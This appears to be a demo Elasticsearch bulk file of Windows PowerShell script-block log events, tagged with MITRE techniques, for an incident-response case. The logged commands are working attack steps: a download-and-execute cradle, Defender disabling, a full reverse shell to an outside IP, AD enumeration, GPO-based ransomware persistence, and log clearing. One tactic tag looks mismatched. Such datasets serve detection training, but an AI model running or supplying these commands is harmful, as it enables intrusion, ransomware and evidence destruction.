{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-001"}}
{"@timestamp":"2025-11-14T02:33:22.441Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"powershell":{"engine":{"version":"5.1"},"scriptblock":{"id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","text":"IEX (New-Object Net.WebClient).DownloadString('https://update-service.ru/payload')"},"warning_ids":[4104]},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":4104,"keywords":["PowerShell Script Block Logging"]},"message":"Обнаружен подозрительный ScriptBlock: загрузка и исполнение удалённого кода через Net.WebClient","tags":["CASE-2025-001","execution","powershell","download-cradle"],"iris":{"case_id":"CASE-2025-001","ioc":"hxxps://update-service[.]ru/payload.exe","mitre_technique":"T1059.001","mitre_tactic":"TA0002"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-002"}}
{"@timestamp":"2025-11-14T02:34:01.002Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"powershell":{"scriptblock":{"text":"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true"}},"user":{"name":"ivanova_e","domain":"ROSTECH"},"winlog":{"event_id":4104},"message":"Отключение Windows Defender в реальном времени","tags":["CASE-2025-001","defense-evasion","antivirus-disable"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1562.001","mitre_tactic":"TA0005"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-003"}}
{"@timestamp":"2025-11-14T02:34:45.119Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"W10-HR-05","ip":"10.10.5.33"},"powershell":{"scriptblock":{"text":"$client = New-Object System.Net.Sockets.TCPClient('162.247.74.201',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"}},"user":{"name":"ivanova_e"},"winlog":{"event_id":4104},"message":"Reverse shell PowerShell — подключение к 162.247.74.201:4444","tags":["CASE-2025-001","execution","reverse-shell","c2"],"iris":{"case_id":"CASE-2025-001","ioc":"162.247.74.201","mitre_technique":"T1059.001","mitre_tactic":"TA0002"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-004"}}
{"@timestamp":"2025-11-14T03:44:11.003Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"DC-01","ip":"10.10.1.10"},"powershell":{"scriptblock":{"text":"Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties * | Select SamAccountName,PasswordLastSet,Enabled | Export-Csv C:\\Windows\\Temp\\users.csv"}},"user":{"name":"admin_backup","domain":"ROSTECH"},"winlog":{"event_id":4104},"message":"Выгрузка списка пользователей AD в CSV-файл","tags":["CASE-2025-001","discovery","ad-enum"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1087.002","mitre_tactic":"TA0007"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-005"}}
{"@timestamp":"2025-11-14T04:44:08.002Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"DC-01","ip":"10.10.1.10"},"powershell":{"scriptblock":{"text":"Get-GPO -All | ForEach-Object { New-GPLink -Name $_.DisplayName -Target 'DC=rostech,DC=local' }; Set-GPRegistryValue -Name 'Default Domain Policy' -Key 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName updater32 -Type String -Value 'C:\\Windows\\Temp\\lockbit3.exe'"}},"user":{"name":"admin_backup"},"winlog":{"event_id":4104},"message":"Распространение LockBit через GPO — прописка в Run ключ реестра","tags":["CASE-2025-001","impact","gpo-abuse","ransomware"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1484.001","mitre_tactic":"TA0006"}}
{"index":{"_index":"winlogbeat-demo-2025.11.14","_id":"ps-006"}}
{"@timestamp":"2025-11-14T04:45:59.001Z","event":{"kind":"event","category":["process"],"type":["info"],"code":"4104","provider":"Microsoft-Windows-PowerShell"},"host":{"name":"DC-01","ip":"10.10.1.10"},"powershell":{"scriptblock":{"text":"wevtutil cl Security; wevtutil cl System; wevtutil cl Application; Remove-Item C:\\Windows\\Prefetch\\*.pf -Force"}},"user":{"name":"SYSTEM"},"winlog":{"event_id":4104},"message":"Очистка журналов событий Windows и файлов Prefetch","tags":["CASE-2025-001","defense-evasion","log-clearing"],"iris":{"case_id":"CASE-2025-001","mitre_technique":"T1070.001","mitre_tactic":"TA0005"}}
